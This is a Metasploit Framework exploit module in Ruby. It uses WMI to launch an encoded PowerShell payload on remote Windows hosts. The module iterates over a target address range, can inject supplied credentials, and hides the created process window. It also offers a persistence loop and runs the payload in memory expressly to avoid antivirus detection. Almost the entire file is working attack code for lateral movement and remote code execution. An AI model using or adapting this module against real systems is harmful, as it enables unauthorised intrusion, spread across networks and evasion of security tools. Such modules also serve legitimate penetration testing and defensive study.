
##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# Ideally the methods to create WMI wrapper functions and their callers
# should be in /lib/msf/core/post/windows/powershell/ps_wmi.rb.
##

require 'msf/core'
require 'msf/core/post/windows/powershell'
require 'msf/core/post/windows/powershell/dot_net'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Post::Windows::Powershell
	include Msf::Post::Windows::Powershell::DotNet

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Current User WMI Exec Powershell",
			'Description'          => %q{
				This module uses WMI execution to launch a payload instance on a remote machine.
				In order to avoid AV detection, all execution is performed in memory via psh-net
				encoded payload. Persistence option can be set to keep the payload looping while
				a handler is present to receive it. By default the module runs as the current
				process owner. The module can be configured with credentials for the remote host
				with which to launch the process.
			},
			'License'              => MSF_LICENSE,
			'Author'               => 'RageLtMan <rageltman[at]sempervictus>',
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'Targets' => [ [ 'Universal', {} ] ],
			'DefaultTarget' => 0,

		))

		register_options(
			[
				OptAddressRange.new("RHOSTS", [ false, "Target address range or CIDR identifier" ]),
				OptString.new('USERNAME', [false, "Username to authenticate as"]),
				OptString.new('PASSWORD', [false, "Password to authenticate with"]),
				OptString.new('DOMAIN', [false, "Domain or machine name"]),

			], self.class)

		register_advanced_options(
			[
				OptBool.new('PERSIST', [false, 'Run the payload in a loop']),
				OptBool.new('RUN_WOW64', [
					false, 
					'Execute powershell in 32bit compatibility mode, payloads need native arch',
					false
				]),

			], self.class)

	end

	def exploit

		# Make sure we meet the requirements before running the script
		# Shell sessions can't kill PIDs 
		if !(session.type == "meterpreter" || have_powershell?)
			print_error("Incompatible Environment")
			return
		end
		# SYSTEM doesnt have credentials on remote hosts
		if client.sys.config.getuid =~ /system$/i
			print_error("Cannot run as system")
			return 0
		end
		
		run_opts = {}
		run_opts[:username] = datastore['USERNAME']
		run_opts[:domain] = datastore['DOMAIN'] || '.'
		run_opts[:password] = datastore['PASSWORD']

		# End of file marker
		eof = Rex::Text.rand_text_alpha(8)
		env_suffix = Rex::Text.rand_text_alpha(8)

		# Create base64 encoded payload
		psh_payload= Msf::Util::EXE.to_win32pe_psh_net(framework, payload.encoded)
		psh_payload = compress_script(psh_payload, eof)
		# WMI exec function - this is going into powershell.rb after pull 701 is commited
		script = ps_wmi_exec(run_opts)
		# Build WMI exec calls to every host into the script to reduce PS instances
		# Need to address arch compat issue here, check powershell.exe arch, check pay arch
		# split the hosts into wow64 and native, and run each range separately
		ps_bin = datastore['RUN_WOW64'] ? 'cmd /c %windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe' : 'powershell.exe'
		# for whatever reason, passing %systemroot% instead of 'C:\windows' fails

		if datastore["RHOSTS"]
			# Iterate through our hosts list adding a call to the WMI wrapper for each.
			# This should learn to differentiate between hosts and call WOW64 as appropriate,
			# as well as putting the payload into a variable when many hosts are hit so the 
			# uploaded script is not bloated since each encoded payload is bulky.

			Rex::Socket::RangeWalker.new(datastore["RHOSTS"]).each do |host|
				if run_opts[:username] and run_opts[:password]
					script << "\r\n New-RemoteProcess -rhost \"#{host}\" -login \"#{run_opts[:domain]}\\#{run_opts[:username]}\""
					script << " -pass \"#{run_opts[:password]}\" -cmd \"#{ps_bin} -EncodedCommand #{psh_payload}\"\r\n"
				else
					script << "\r\n New-RemoteProcess -rhost \"#{host}\" -cmd \"#{ps_bin} -EncodedCommand #{psh_payload}\"\r\n"
				end
			end
		else
			# Run locally - this seems to be broken at the moment, attempting to run
			# via WMI from localhost results in 'Exception calling "CompileAssemblyFromSource" 
			# with "2" argument(s): "The environment block used to start a process 
			# cannot be longer than 65535 bytes.'

			if run_opts[:username] and run_opts[:password]
				script << "\r\n New-RemoteProcess -login \"#{run_opts[:domain]}\\#{run_opts[:username]}\""
				script << " -pass \"#{run_opts[:password]}\" -cmd \"#{ps_bin} -EncodedCommand #{psh_payload}\"\r\n"
			else
				script << "\r\n New-RemoteProcess -cmd \"#{ps_bin} -EncodedCommand #{psh_payload}\"\r\n"
			end
		end

		# Compress
		print_status('Compressing script contents:')
		compressed_script = compress_script(script, eof)

		# If the compressed size is > 8100 bytes, launch stager
		if (compressed_script.size > 8100)
			print_error(" - Compressed size: #{compressed_script.size}")
			error_msg =  "Compressed size may cause command to exceed "
			error_msg += "cmd.exe's 8kB character limit."
			print_error(error_msg)
			print_status('Launching stager:')
			script = stage_to_env(compressed_script, env_suffix)
			print_good("Payload successfully staged.")
		else
			print_good(" - Compressed size: #{compressed_script.size}")
			script = compressed_script
		end

		# Execute the powershell script
		print_status('Executing the script.')
		cmd_out, running_pids, open_channels = execute_script(script, true)
		# Read output and clean up
		get_ps_output(cmd_out,eof)
		vprint_good( "Cleaning up #{running_pids.join(', ')}" )

		clean_up(nil, eof, running_pids, open_channels, env_suffix, false)

		print_good('Finished!')
	end

	# Wrapper function for instantiating a WMI win32_process
	# class object in powershell.
	# Insantiates the [wmiclass] object and configures the scope
	# Sets impersonation level and injects credentials as needed
	# Configures application startup options to hide the newly
	# created window. Adds start-up check for remote proc.
	def ps_wmi_exec(opts = {})

		ps_wrapper = <<EOS
Function New-RemoteProcess {
    Param([string]$rhost,[string]$cmd,[string]$login,[string]$pass)
    $ErrorActionPreference="SilentlyContinue"
	$proc = [WMIClass]"\\\\$rhost\\root\\cimv2:Win32_Process"
EOS
	if opts[:username] and opts[:password]
		ps_wrapper += <<EOS
	$proc.psbase.Scope.Options.userName = $login
	$proc.psbase.Scope.Options.Password = $pass
EOS
	end
	ps_wrapper += <<EOS
	$proc.psbase.Scope.Options.Impersonation = [System.Management.ImpersonationLevel]::Impersonate
	$proc.psbase.Scope.Options.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy
	$startup = [wmiclass]"Win32_ProcessStartup"
	$startup.Properties['ShowWindow'].value=$False
	$remote = $proc.Create($cmd,'C:\\',$startup)
	if ($remote.returnvalue -eq 0) {
		Write-Host "Successfully launched on $rhost with a process id of" $remote.processid
	} else {
		Write-Host "Failed to launch on $rhost. ReturnValue is" $remote.ReturnValue
	}
}

EOS
		

	return ps_wrapper
	end

end
